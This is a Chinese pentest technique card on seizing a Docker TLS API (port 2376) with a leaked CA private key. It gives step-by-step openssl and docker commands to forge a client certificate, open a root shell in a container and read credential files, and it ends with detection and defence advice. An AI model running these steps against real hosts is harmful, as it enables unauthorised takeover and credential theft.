---
id: cloud-container-docker-tls-ca-key-client-cert-api
title: Docker TLS 2376 + 泄露 CA 私钥：自签客户端证书接管 Docker API 并进入容器
type: scenario
domain: cloud
path: cloud/container
technique: docker-tls-ca-key-client-cert
aliases:
- Docker CA 私钥
- Docker TLS 2376
- docker --tlsverify
- 自签客户端证书
- Docker API 接管
tags:
- docker
- tls
- ca-key
- client-cert
- api
- container
- privilege-escalation
- mtls
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V81
  verified_at: '2026-11-05T17:58:00+08:00'
  notes: 已对照原文与 img21-25：certs/ 泄露 ca-key.pem/ca.pem，攻击者 openssl 自签 client 证书（EKU clientAuth），docker --tls -H tcp://127.0.0.1:2376 ps 列出 pwm/pgadmin4/web/postgres/gitea，docker --tlsverify exec -it pwm /bin/bash 获 uid=0(root)。卡片一致；未实测。
---

## 一句话结论

拿到 Docker CA 的 `ca-key.pem` 后，可自签任意 CN 的客户端证书，通过 `docker --tlsverify -H tcp://host:2376` 通过 mTLS 认证，列出、进入或创建容器；若目标容器以 root 运行（原文 PWM 容器即 uid=0），可直接获得容器 root，并可视权限进一步逃逸/横向。

## 原理

- Docker daemon 开启 TLS 时，常用 `--tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem`，要求客户端证书由同一 CA 签发；CA 私钥就是信任根。
- 泄露 `ca-key.pem` 后，攻击者可用 `openssl genrsa` 生成客户端私钥，`openssl req -new -subj "/CN=root"` 生成 CSR，再用 `openssl x509 -req -CA ca.pem -CAkey ca-key.pem -extfile <(echo extendedKeyUsage=clientAuth)` 签发客户端证书。
- Docker 只校验证书链与 EKU（clientAuth），不要求 CN 与具体用户绑定；因此任意 CN 的证书都能通过认证，获得等价于 Docker API 的控制权。
- Docker API 等价于宿主机高权：可 `docker ps` 查看所有容器、`docker exec -it <container> /bin/bash` 进入容器；若容器以 root 运行，直接得到容器内 root；进一步可创建挂载宿主机根目录的 privileged 容器逃逸。
- 原文的 CA 私钥来自 NFS 共享的 `certs/ca-key.pem`，形成“NFS UID/GID 伪造读证书 → 签发客户端证书 → Docker API 接管”的链。

## 触发条件

- Docker daemon 的 TLS API（2376/tcp，或本地转发的 2376）可达；
- 已获得签发该 daemon 客户端证书的 CA 私钥（`ca-key.pem`）与 CA 证书；
- daemon 使用 `--tlsverify` 校验客户端证书；若仅 `--tls` 不校验客户端证书，则无需证书即可访问；
- 目标容器以 root 运行或挂载敏感目录/套接字，才能把 API 权限扩大为实际数据/主机控制。

## 利用步骤

1. 收集证书：`ca.pem`、`ca-key.pem`、`server-cert.pem`、`server-key.pem`（原文从 NFS 共享 `certs/` 读取）。
2. 生成客户端私钥与 CSR：
   ```bash
   openssl genrsa -out client-key.pem 4096
   openssl req -new -key client-key.pem -out client.csr -subj "/CN=root"
   echo "extendedKeyUsage = clientAuth" > extfile.cnf
   ```
3. 用泄露的 CA 私钥签发客户端证书：
   ```bash
   openssl x509 -req -days 365 -sha256 \
     -in client.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial \
     -out client-cert.pem -extfile extfile.cnf
   ```
4. 访问 Docker API：
   ```bash
   docker --tls --tlscacert=ca.pem --tlscert=client-cert.pem --tlskey=client-key.pem \
     -H=tcp://127.0.0.1:2376 ps
   ```
5. 进入目标容器：
   ```bash
   docker --tlsverify --tlscacert=ca.pem --tlscert=client-cert.pem --tlskey=client-key.pem \
     -H=tcp://127.0.0.1:2376 exec -it <container> /bin/bash
   ```
6. 在容器内 `id`、读取配置/凭据；如具备权限，进一步用挂载宿主机根目录的容器逃逸（注意影响）。
7. 清理生成的证书/CSR 与临时文件，记录 API 访问与容器操作。

## PoC

```bash
openssl genrsa -out client-key.pem 4096
openssl req -new -key client-key.pem -out client.csr -subj "/CN=root"
echo "extendedKeyUsage = clientAuth" > extfile.cnf
openssl x509 -req -days 365 -sha256 -in client.csr \
  -CA ca.pem -CAkey ca-key.pem -CAcreateserial \
  -out client-cert.pem -extfile extfile.cnf

docker --tls --tlscacert=ca.pem --tlscert=client-cert.pem --tlskey=client-key.pem \
  -H=tcp://127.0.0.1:2376 ps

docker --tlsverify --tlscacert=ca.pem --tlscert=client-cert.pem --tlskey=client-key.pem \
  -H=tcp://127.0.0.1:2376 exec -it pwm /bin/bash

# 容器内
id
cat /config/PwmConfiguration.xml
```

## 变体与关联

- 变体：若 daemon 仅监听 2375 且无 TLS/认证，直接使用 Docker CLI 即可，见 [[cloud-container-docker-socket-tcp-escape]]；若容器内挂载 `/var/run/docker.sock`，同理。
- 变体：CN 不受限制时可任意命名；部分环境会校验 CN/OU，需要按已知客户端证书的 Subject 结构签发。
- 关联：CA 私钥来源 [[pentest-privilege-escalation-nfs-uid-gid-owner-impersonation]]；进入容器后读取配置并篡改 LDAP 的链 [[web-generic-auth-pwm-config-editor-ldap-url-responder]]。

## 检测与防御

- 检测：Docker API 出现未知客户端证书/CN 的 `ps`/`exec`/`create` 请求；`/var/lib/docker` 或共享目录中的 CA 私钥被读取；容器内出现异常交互式 Shell；2376 端口暴露面与来源异常。
- 防御：CA 私钥离线保管，不放在容器/共享目录；为每个客户端签发独立证书并做吊销/轮换；限制 2376 仅管理网可达并启用 mTLS；使用 Docker authorization plugin 限制 API 操作；监控 API 审计日志与异常容器创建；禁止容器以 root 运行、限制 privileged 与宿主机挂载。
- 注意：Docker API 权限通常等价于宿主机 root，测试时避免创建/删除生产容器；`--tls` 与 `--tlsverify` 的安全差异要区分。
